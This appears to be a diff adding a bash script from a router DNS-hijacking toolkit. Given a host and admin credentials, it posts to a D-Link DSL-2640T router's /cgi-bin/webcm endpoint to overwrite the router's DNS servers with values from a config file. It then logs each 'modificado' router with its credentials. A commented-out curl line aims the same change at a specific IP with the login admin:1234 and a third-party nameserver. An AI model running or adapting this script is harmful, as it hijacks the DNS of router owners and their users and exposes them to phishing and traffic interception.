@@ -1,0 +1,19 @@
+#!/bin/bash
+
+##########################
+# by bonny               #
+##########################
+# CONFIG
+source configs/changers.cfg
+HOSTNAME="$1"
+USERNAME="$2"
+PASSWORD="$3"
+PASSWD="eldiablo"
+###########################
+
+${CURL} -u "$USERNAME:$PASSWORD" -d "uiPostStaticDns1=$DNS1&uiPostStaticDns2=$DNS2&uiPostDNSRelay=2&getpage=../html/home/home_dns.htm&uiViewDns1Mark=$DNS1&uiViewDns2Mark=$DNS2&uiViewDNSRelay=2&resolver:settings/nameserver1=$DNS1&resolver:settings/nameserver2=$DNS2&dproxy:settings/state=" "http://$HOSTNAME/cgi-bin/webcm" 1>/dev/null 2>/dev/null
+
+echo "[+] modificado, http://$HOSTNAME $USERNAME:$PASSWORD [D-LINK DSL-2640T]"
+echo "http://$HOSTNAME ($USERNAME:$PASSWORD => ${PASSWD}) [D-LINK DSL-2640T]" >> logs/modificados.log
+
+#curl -s -u 'admin:1234' --referer 'http://177.1.211.173/cgi-bin/webcm?getpage=../html/home/home_dns.htm' --data-urlencode 'getpage=../html/home/home_dns.htm&resolver:settings/nameserver1=167.114.17.149&resolver:settings/nameserver2=8.8.8.8&dproxy:settings/state=2' 'http://177.1.211.173/cgi-bin/webcm'
